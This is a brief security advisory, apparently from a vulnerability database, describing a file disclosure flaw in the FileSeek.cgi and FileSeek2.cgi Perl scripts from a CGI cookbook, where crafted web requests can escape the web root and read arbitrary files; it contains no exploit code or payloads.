FileSeek is an example cgi-script from "The CGI/Perl Cookbook from John Wiley &
Sons". The script is written and maintained by Craig Patchett. It is mainly used to find and download files on a web server.

FileSeek.cgi and FileSeek2.cgi are prone to a file disclosure vulnerability. It is possible for a remote attacker to submit a maliciously crafted web request which is capable of breaking out of the wwwroot directory and browsing arbitrary web-readable files on a host running the vulnerable script.
